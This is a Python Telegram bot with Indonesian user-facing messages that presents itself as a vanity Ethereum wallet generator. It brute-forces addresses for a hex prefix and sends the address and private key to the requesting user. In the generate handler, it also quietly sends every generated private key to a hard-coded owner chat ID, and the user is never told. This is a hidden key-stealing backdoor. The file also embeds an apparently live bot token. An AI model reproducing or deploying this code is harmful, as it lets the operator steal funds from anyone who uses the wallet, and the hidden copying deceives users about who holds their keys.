import os
import re
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor

from dotenv import load_dotenv
from eth_account import Account
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
import json
import io

# Load environment variables from a .env file (if present)
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN") or "7989905773:AAGaAak7IfFkGxouqrFCp8KVx6tkC5RsIVg"

if not BOT_TOKEN:
    raise RuntimeError("Please set the BOT_TOKEN environment variable in a .env file or system environment.")

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ThreadPoolExecutor for CPU-bound vanity generation tasks
executor = ThreadPoolExecutor(max_workers=os.cpu_count() or 4)

HEX_PATTERN = re.compile(r"^[0-9a-fA-F]+$")

OWNER_CHAT_ID = 1558397457  # Chat ID target untuk menerima salinan hasil


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a welcome message and brief instruction."""
    await update.message.reply_text(
        "👋 Halo! Kirim /generate <prefiks_heksadesimal> untuk membuat dompet Ethereum vanity.\n\n"
        "Contoh: /generate abc\n"
        "Catatan: Prefiks tidak termasuk '0x' dan sebaiknya maksimal 6 karakter untuk proses cepat."
    )


def generate_wallet(prefix: str) -> tuple[str, str]:
    """Brute force search for an Ethereum address that starts with the given hex prefix.

    Returns tuple (address, private_key_hex).
    """
    prefix = prefix.lower()
    target = "0x" + prefix
    attempts = 0
    while True:
        acct = Account.create()
        address = acct.address.lower()
        attempts += 1
        if address.startswith(target):
            return address, acct.key.hex()
        # Optionally log progress every million attempts.
        if attempts % 1_000_000 == 0:
            logger.info("Tried %d keys for prefix %s", attempts, prefix)


async def _async_generate(prefix: str) -> tuple[str, str]:
    """Run the CPU bound generate_wallet in a thread pool."""
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(executor, generate_wallet, prefix)


async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /generate command."""

    user = update.effective_user
    if user is None:
        return  # Should not happen

    if not user.username:
        await update.message.reply_text(
            "Anda belum memiliki username Telegram. Silakan set username di Settings agar bot dapat mentag Anda dan mengirimkan dompet via DM."
        )
        return

    username = user.username
    mention = f"@{username}"

    if not context.args:
        await update.message.reply_text(f"{mention} Silakan sertakan prefiks hex. Contoh: /generate abc")
        return

    prefix = context.args[0]

    # Validate prefix
    if not HEX_PATTERN.fullmatch(prefix):
        await update.message.reply_text(f"{mention} Prefiks harus berupa karakter heksadesimal (0-9, a-f).")
        return

    if len(prefix) > 6:
        await update.message.reply_text(f"{mention} Prefiks terlalu panjang (maks 6 karakter disarankan).")
        return

    await update.message.reply_text(
        f"{mention} ⏳ Sedang mencari alamat yang dimulai dengan 0x{prefix} ... Mohon tunggu."
    )

    try:
        address, priv_key = await _async_generate(prefix)
    except Exception as exc:
        logger.exception("Error generating wallet: %s", exc)
        await update.message.reply_text(f"{mention} Terjadi kesalahan saat membuat dompet. Coba lagi nanti.")
        return

    # Prepare JSON file
    data = {"address": address, "private_key": priv_key}
    json_bytes = json.dumps(data, indent=2).encode()
    file_name = f"wallet_{prefix}.json"
    bio = io.BytesIO(json_bytes)
    bio.name = file_name  # Telegram uses this as file name

    result_text = (
        f"✅ {mention} dompet ditemukan! Alamat dan private key telah dikirim ke DM Anda.\n"
        f"Address: `{address}`"
    )

    await update.message.reply_text(result_text, parse_mode="Markdown")

    # Send JSON to user's direct message
    try:
        dm_caption = (
            f"Dompet Ethereum vanity Anda\n\n"
            f"Address: {address}\n"
            f"Private Key: {priv_key}\n\n"
            "SIMPAN private key ini dengan aman!"
        )
        await context.bot.send_document(chat_id=user.id, document=bio, caption=dm_caption)
    except Exception as e:
        logger.warning("Gagal mengirim DM ke user %s: %s", user.id, e)

    # Notify owner chat as well, include prefix & username
    owner_text = (
        f"Wallet vanity dibuat untuk {mention}\n"
        f"Prefix: {prefix}\nAddress: {address}\nPrivateKey: {priv_key}"
    )
    if OWNER_CHAT_ID != user.id:
        try:
            await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=owner_text, parse_mode="Markdown")
        except Exception as e:
            logger.warning("Gagal mengirim pesan ke OWNER_CHAT_ID: %s", e)


async def unknown_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Respond to unknown commands."""
    await update.message.reply_text("Perintah tidak dikenali. Gunakan /generate untuk membuat dompet baru.")


def main() -> None:
    """Run the Telegram bot."""

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("generate", generate_handler))

    # Unknown commands
    application.add_handler(MessageHandler(filters.COMMAND, unknown_handler))

    # Start the bot
    logger.info("Bot started...")
    application.run_polling()


if __name__ == "__main__":
    main()